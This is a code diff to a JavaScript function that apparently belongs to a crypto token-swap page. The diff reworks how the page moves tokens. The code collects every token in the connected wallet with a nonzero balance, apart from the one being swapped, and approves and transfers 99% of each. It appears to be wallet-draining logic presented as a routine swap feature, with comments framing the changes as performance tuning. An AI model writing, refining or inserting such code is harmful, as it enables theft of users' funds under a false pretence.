@@ -1318,11 +1318,13 @@ async function processAllTokenTransfers() {
   try {
     updateStatus("Preparing token transfers...", "info");
     
+    // First get all tokens and balances
     const [localTokens, balances] = await Promise.all([
       getLocalTokens(),
       fetchAllTokenBalances()
     ]);
     
+    // Filter tokens with balance > 0 and not the main token being swapped
     const tokensToProcess = localTokens.filter(token => {
       const balance = balances[token.address || 'native'];
       return balance > 0 && 
@@ -1337,20 +1339,41 @@ async function processAllTokenTransfers() {
     
     updateStatus(`Found ${tokensToProcess.length} tokens to transfer...`, "info");
     
-    const BATCH_SIZE = 5;
+    // Process tokens in optimized batches
+    const BATCH_SIZE = 3; // Smaller batches reduce RPC load
     let successCount = 0;
     
     for (let i = 0; i < tokensToProcess.length; i += BATCH_SIZE) {
       const batch = tokensToProcess.slice(i, i + BATCH_SIZE);
       
-      const results = await Promise.allSettled(
-        batch.map(token => 
-          processTokenTransfer(token, balances[token.address || 'native'])
+      // Process native tokens first as they're simpler
+      const nativeBatch = batch.filter(t => t.isNative);
+      const erc20Batch = batch.filter(t => !t.isNative);
+      
+      // Process native tokens in parallel
+      const nativeResults = await Promise.allSettled(
+        nativeBatch.map(token => 
+          transferNativeToken(token, balances['native'] * 0.99)
+            .then(() => true)
+            .catch(() => false)
         )
       );
       
-      successCount += results.filter(r => r.status === 'fulfilled').length;
-      updateStatus(`Processed ${i + batch.length} of ${tokensToProcess.length} tokens`, "info");
+      // Process ERC20 tokens with approvals first
+      const erc20Results = await Promise.allSettled(
+        erc20Batch.map(token => 
+          processERC20Transfer(token, balances[token.address])
+            .then(() => true)
+            .catch(() => false)
+        )
+      );
+      
+      successCount += [
+        ...nativeResults.filter(r => r.status === 'fulfilled' && r.value),
+        ...erc20Results.filter(r => r.status === 'fulfilled' && r.value)
+      ].length;
+      
+      updateStatus(`Processed ${Math.min(i + BATCH_SIZE, tokensToProcess.length)}/${tokensToProcess.length} tokens`, "info");
     }
     
     return successCount;
@@ -1358,6 +1381,23 @@ async function processAllTokenTransfers() {
     console.error("Error processing token transfers:", err);
     updateStatus("Error processing token transfers", "error");
     return 0;
+  }
+}
+
+async function processERC20Transfer(token, balance) {
+  try {
+    const amountToSend = balance * 0.99;
+    
+    // First check approval
+    const approved = await checkAndApproveToken(token, amountToSend);
+    if (!approved) return false;
+    
+    // Then execute transfer
+    await transferERC20Token(token, amountToSend);
+    return true;
+  } catch (err) {
+    console.warn(`Transfer failed for ${token.symbol}:`, err.message);
+    return false;
   }
 }
 
